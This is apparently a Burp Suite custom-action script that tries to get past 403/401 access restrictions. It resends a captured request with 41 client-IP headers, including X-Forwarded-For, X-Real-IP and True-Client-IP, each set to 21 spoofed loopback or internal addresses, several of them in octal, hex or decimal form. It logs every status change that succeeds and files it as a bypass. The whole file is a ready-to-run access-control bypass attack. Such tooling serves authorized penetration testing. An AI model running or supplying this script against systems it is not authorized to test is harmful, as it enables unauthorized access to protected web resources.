id: b089c2e1-45f8-4b7b-9c6d-bypass-ip-001
name: 403/401 Bypass - IP Headers
function: CUSTOM_ACTION
location: REPEATER
source: |+
  // 403/401 Bypass - IP Header Injection
  // Tests bypass using X-Forwarded-For, X-Real-IP, and similar headers
  
  int DELAY_MS = 50;
  boolean VERBOSE = true;
  
  String[] BYPASS_IPS = {
      "127.0.0.1", "localhost", "127.1", "0.0.0.0", "0000::1", "::1",
      "::ffff:127.0.0.1", "::ffff:7f00:0001", "10.0.0.1", "10.0.0.0",
      "172.16.0.1", "192.168.1.1", "192.168.0.1", "0177.0.0.01",
      "0x7f.0x0.0x0.0x1", "0x7f000001", "2130706433", "127.000.000.001",
      "0", "null", "8.8.8.8"
  };
  
  String[] IP_HEADERS = {
      "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Server", "X-Forwarded",
      "X-Forward-For", "X-Forwarder-For", "Forwarded-For", "Forwarded-For-Ip",
      "Forwarded", "X-Real-IP", "X-Real-Ip", "Real-Ip", "X-Remote-IP",
      "X-Remote-Addr", "Remote-Addr", "X-Client-IP", "X-Client-Ip", "Client-IP",
      "Client-Ip", "Clientip", "X-Clientip", "X-Originating-IP", "X-Originating-Ip",
      "X-Originally-Forwarded-For", "X-Original-Remote-Addr", "True-Client-IP",
      "True-Client-Ip", "CF-Connecting-IP", "CF-Connecting_IP", "Cf-Connecting-Ip",
      "Cf-Ipcountry", "Fastly-Client-Ip", "Incap-Client-Ip", "X-Cluster-Client-IP",
      "Cluster-Client-IP", "X-ProxyUser-Ip", "X-Host", "X-Custom-IP-Authorization",
      "Proxy-Host", "From", "Via"
  };
  
  var originalRequest = requestResponse.request();
  var httpService = requestResponse.httpService();
  int originalStatus = requestResponse.response().statusCode();
  
  logging.logToOutput("=== 403/401 Bypass - IP Headers ===");
  logging.logToOutput("Target: " + httpService.host() + originalRequest.path());
  logging.logToOutput("Original Status: " + originalStatus);
  logging.logToOutput("");
  
  int total = 0, success = 0;
  
  java.util.function.BiPredicate<Integer, Integer> isSuccess = (orig, curr) -> 
      (curr >= 200 && curr < 400) && (orig == 401 || orig == 403);
  
  for (String header : IP_HEADERS) {
      for (String ip : BYPASS_IPS) {
          try {
              var req = originalRequest.withHeader(header, ip);
              var resp = api.http().sendRequest(req);
              Thread.sleep(DELAY_MS);
              
              int status = resp.response().statusCode();
              String note = header + ": " + ip + " -> " + status;
              
              if (isSuccess.test(originalStatus, status)) {
                  success++;
                  logging.logToOutput("[+] SUCCESS: " + note);
                  var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(req, resp.response());
                  rr.annotations().setNotes("IP Header Bypass: " + note);
                  api.organizer().sendToOrganizer(rr);
              } else if (VERBOSE) {
                  logging.logToOutput("[-] " + note);
              }
              total++;
          } catch (Exception e) {
              logging.logToError("Error: " + e.getMessage());
          }
      }
  }
  
  logging.logToOutput("");
  logging.logToOutput("=== Complete: " + total + " requests, " + success + " bypasses ===");
